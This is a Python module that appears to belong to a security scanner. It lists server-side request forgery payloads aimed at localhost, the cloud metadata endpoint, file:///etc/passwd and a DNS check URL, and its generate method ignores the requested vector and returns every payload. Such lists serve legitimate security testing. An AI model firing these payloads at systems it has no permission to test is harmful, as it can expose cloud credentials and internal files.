"""
===============================================================================
Server-Side Request Forgery Payload Provider
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


LOCALHOST_PAYLOADS = (

    "http://127.0.0.1",

    "http://localhost",

)

METADATA_PAYLOADS = (

    "http://169.254.169.254/latest/meta-data/",

    "http://169.254.169.254/",

)

FILE_PAYLOADS = (

    "file:///etc/passwd",

)

DNS_PAYLOADS = (

    "http://example.com",

)

PAYLOAD_DATABASE = {

    "localhost": LOCALHOST_PAYLOADS,

    "metadata": METADATA_PAYLOADS,

    "file": FILE_PAYLOADS,

    "dns": DNS_PAYLOADS,

}


class SSRFPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )